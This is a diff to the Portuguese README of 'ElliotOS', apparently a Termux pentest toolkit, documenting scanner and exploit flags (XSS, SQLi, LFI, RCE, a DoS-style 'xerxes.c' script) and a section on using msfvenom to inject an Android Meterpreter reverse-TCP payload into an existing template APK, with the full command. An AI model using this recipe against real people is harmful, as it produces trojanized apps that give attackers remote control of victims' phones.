@@ -78,32 +78,175 @@ A CYN é a inteligência artificial integrada diretamente no ElliotOS. Ela conhe
 
 Suporta múltiplos providers: **Gemini**, **OpenAI**, **Claude** e outros — configuráveis via `ms -a`.
 
-### Módulos de segurança (`mod.*`)
+### ms — Referência de flags
 
-Dentro do REPL (`ms`), você tem acesso a módulos de pentest nativos em Lua:
-
-```lua
--- Reconhecimento
-mod.recon.dns("alvo.com")
-mod.recon.whois("alvo.com")
-mod.recon.headers("https://alvo.com")
-
--- Scanning
-mod.scan.ports("192.168.1.1", {22, 80, 443, 8080})
-mod.scan.tcp("192.168.1.1", 80)
-
--- Web
-mod.web.get("https://alvo.com")
-mod.web.post("https://alvo.com/login", {user="admin", pass="teste"})
-
--- Crypto
-mod.crypto.md5("texto")
-mod.crypto.sha256("texto")
-mod.crypto.base64_encode("texto")
-
--- SQLite integrado
-local db = sqlite.open("resultados.db")
+**Geral**
+```bash
+ms                            # REPL interativo
+ms -c 'codigo lua'           # executa Lua sem abrir REPL
+ms -f script.lua             # executa arquivo
+ms -e                         # abre ElliotOS Editor (arquivo novo)
+ms -e arquivo               # abre/cria arquivo no ElliotOS Editor
+ms -lua2c arquivo.lua       # transpila Lua → C (gera arquivo.c)
+ms -lua2c -r arquivo.lua   # transpila e compila com cxx
+ms -i                         # info do sistema
+ms -v                         # versão
+ms -h                         # ajuda completa
 ```
+
+**IA (CYN)**
+```bash
+ms -a                         # chat interativo com a CYN
+ms -a 'pergunta'             # pergunta direta
+ms -A 'pergunta'             # resposta raw sem formatação
+ms -a -f arq 'pergunta'      # passa arquivo como contexto para a CYN
+ms --search 'query'          # pesquisa na web e resume o resultado
+ms --code [-o arq] 'tarefa'  # gera código/script (-o salva no arquivo)
+```
+
+**Rede**
+```bash
+ms -g url                    # HTTP GET
+ms --post url dados          # HTTP POST
+ms --headers url             # headers da resposta
+ms --ip                       # IP público
+ms -d host                   # DNS lookup
+ms -P host                   # ping
+ms --scan host p1 p2         # port scan
+ms --listen porta            # listener TCP
+ms --socket fam type h p     # fire-and-forget socket
+```
+
+**Pentest**
+```bash
+ms -x url [N]                # XSS
+ms -q url [N]                # SQLi
+ms -l url [N]                # LFI
+ms -r url [N]                # RCE
+ms -N url                    # NoSQL Injection
+ms --ssrf url [N]            # SSRF
+ms --redir url [N]           # Open Redirect
+ms --ssti url [N]            # SSTI
+ms --scan-all url [N]        # todos os scanners de uma vez
+ms -s url [limit] [ep]       # spider (ep filtra só endpoints)
+ms -p easy|med|hard          # sobe lab vulnerável
+ms -p stop                    # encerra todos os labs
+ms -web arquivo porta        # sobe servidor HTML
+ms -web stop                  # para o servidor web
+ms --exploit-rce url         # exploit.rce REPL
+ms --exploit-sqli url        # exploit.sqli REPL
+ms --exploit-lfi url         # exploit.lfi REPL
+```
+
+> `N` = número de endpoints a testar (padrão: 1; 0 = todos)
+
+**APK**
+```bash
+ms --apk app.apk [app2.apk ...]  # testa compatibilidade e instalabilidade (aceita vários)
+ms --apk-sign app.apk            # alinha e assina um APK já compilado
+web2apk build <dir> [opções]     # converte HTML/CSS/JS em APK sem root
+```
+
+**Crypto**
+```bash
+ms --md5 'texto'             # hash MD5
+ms --sha256 'texto'          # hash SHA256
+ms --b64e 'texto'            # Base64 encode
+ms --b64d 'b64'              # Base64 decode
+ms --jwt 'token'             # decodifica JWT
+```
+
+**Filesystem**
+```bash
+ms --cat arquivo             # lê e imprime arquivo
+ms --ls [dir]               # lista diretório
+ms --write arq texto         # escreve arquivo
+```
+
+**Shell / Sistema**
+```bash
+ms --sh 'cmd'                # executa shell e captura output
+ms --ps                       # lista processos
+ms --kill pid               # mata processo
+ms --env [VAR]              # variáveis de ambiente
+```
+
+**Scripts**
+```bash
+ms --script nome             # executa script Lua ou C do diretório de scripts
+ms --script nome -- [args]   # com argumentos
+ms --cscript nome.c          # compila e executa script C
+ms --cscript binario         # executa binário C já compilado
+
+# Exemplos:
+ms --script cosmic.lua -- --os 8.8.8.8
+ms --script portscan.lua -- 192.168.1.1 80 443
+ms --script xerxes.c -- 192.168.1.1 80
+```
+
+**Aprender**
+```bash
+ms --learn                   # tutorial interativo em português
+ms --examples                # lista scripts de exemplo prontos
+```
+
+**Diagnóstico**
+```bash
+ms -t                        # self-test
+ms -tv                       # self-test verbose
+ms -T                        # stress test
+ms -Tv                       # stress test verbose
+```
+
+---
+
+## web2apk — HTML/CSS/JS para APK
+
+O `web2apk` converte qualquer projeto web local em um APK Android funcional, **sem root, sem Android Studio, sem PC**. Não vem instalado por padrão — é uma ferramenta do XPM:
+
+```bash
+xpm install web2apk
+```
+
+```bash
+# Estrutura mínima do projeto
+./meuapp/
+├── index.html   ← ponto de entrada obrigatório
+├── style.css
+└── script.js
+
+# Gerar APK básico
+web2apk build ./meuapp/
+
+# Com nome, ícone e permissões
+web2apk build ./meuapp/ --name "Meu App" --pkgname com.meuapp --perm camera,mic --fullscreen
+
+# Converter um site remoto em APK
+web2apk build --url https://exemplo.com --name "Meu Site"
+
+# Gerar template de projeto pronto para editar
+web2apk template basic    # HTML + CSS + JS básico
+web2apk template game     # Jogo Snake funcional
+web2apk template pwa      # PWA com suporte offline
+
+# Manual: o que cada arquivo deve conter para o APK funcionar
+web2apk --man
+```
+
+### Opções principais
+
+| Opção | Descrição |
+|-------|-----------|
+| `--name "Nome"` | Nome exibido no launcher |
+| `--pkgname com.pkg.id` | Package ID único |
+| `--icon /path/icon.png` | Ícone PNG do app |
+| `--perm cam,mic,...` | Permissões Android |
+| `--orientation portrait\|landscape\|auto` | Orientação da tela |
+| `--fullscreen` | Esconde a status bar |
+| `--theme dark\|light\|transparent` | Tema da WebView |
+| `--url https://...` | Carrega URL remota em vez de arquivos locais |
+
+> O projeto pode ter múltiplos arquivos HTML, CSS e JS — e subpastas. O único obrigatório como ponto de entrada é o `index.html`.
 
 ---
 
@@ -155,8 +298,64 @@ xpm doctor
 | CTF / Binários | pwntools | pip |
 | Wordlists | seclists | github |
 | AD / Rede | impacket, nuclei | pip / go |
+| Criação de APK | web2apk | nativo ElliotOS |
 
 > **Nenhuma ferramenta exige root para ser instalada ou usada no Termux.**
+
+---
+
+## msfvenom — Payload em APK com template
+
+O ElliotOS integra o Metasploit com suporte a `msfvenom -x` para injetar payloads em APKs existentes. A instalação exige três ferramentas e um passo de diagnóstico:
+
+```bash
+# Passo 1 — instalar as ferramentas
+xpm install apkfull apkeditor metasploit
+
+# Passo 2 — aplicar otimizações e correções no ambiente
+xpm doctor
+```
+
+O `xpm doctor` não é opcional — ele é quem configura o ambiente de verdade. Ao rodar, ele:
+
+- Substitui o apktool interno do Metasploit pelo **apkeditor** diretamente no `apk.rb`, garantindo compatibilidade com APKs antigos e modernos
+- Corrige referências a `/tmp` (que **não existe no Termux**) redirecionando tudo para `$TMPDIR`, que aponta permanentemente para `/data/data/com.termux/files/usr/tmp`
+- Instala wrappers de `msfvenom`, `msfconsole` e `msfrpc` com heap adaptativo para Android
+- Cria e configura o keystore de assinatura de APKs
+- Aplica correções no `apk.rb`: flags, versão mínima, caminhos de payload, multidex, fallback de Activity e FileUtils
+- Remove arquivos desnecessários do bundle (docs, spec, test, .github) para economizar espaço
+- Sobe o banco de dados do msfdb
+
+Após os dois passos, o ambiente estará 100% funcional:
+
+```bash
+# Gerar payload e injetar em um APK template
+msfvenom -p android/meterpreter/reverse_tcp \
+  LHOST=192.168.1.10 LPORT=4444 \
+  -x /caminho/template.apk \
+  -o payload.apk
+```
+
+### Por que apkeditor e não apktool nativo?
+
+| | apktool (padrão do Metasploit) | apkeditor (ElliotOS) |
+|---|---|---|
+| APKs antigos (pré-2018) | ✓ | ✓ |
+| APKs modernos (Android 10+) | ✗ parcial | ✓ |
+| APKs com resources binários | ✗ falha | ✓ |
+| Split APKs | ✗ | ✓ |
+| Disponível no Termux sem root | ✗ | ✓ (tur-repo) |
+| Compatível com `$TMPDIR` do Termux | ✗ | ✓ |
+
+### Sobre o $TMPDIR
+
+O Termux não possui `/tmp`. O script de instalação do ElliotOS define `$TMPDIR` permanentemente apontando para:
+
+```
+/data/data/com.termux/files/usr/tmp
+```
+
+O `xpm doctor` garante que o Metasploit, o apkeditor e todos os scripts que manipulam arquivos temporários usem esse caminho — sem necessidade de configuração manual.
 
 ---
 
@@ -221,11 +420,12 @@ elliot-gui --kill
 
 ```
 ElliotOS/
-├── luascript.sh          # Script único de instalação (~104k linhas)
+├── luascript.sh          # Script único de instalação (~108k linhas)
 │   ├── libnet.c          # Biblioteca C com 23 módulos de segurança
 │   ├── Lua 5.4 source    # Interpretador customizado
 │   ├── lua-net binary    # Embutido como heredoc compilado na instalação
 │   ├── xpm               # Gerenciador de pentest (Bash)
+│   │   └── web2apk       # Conversor HTML/CSS/JS → APK (instalável via xpm)
 │   ├── lpm               # Gerenciador de pacotes Lua (Bash)
 │   ├── cxx               # Compilador wrapper (Bash)
 │   ├── ee                # Editor nativo (C, embutido)
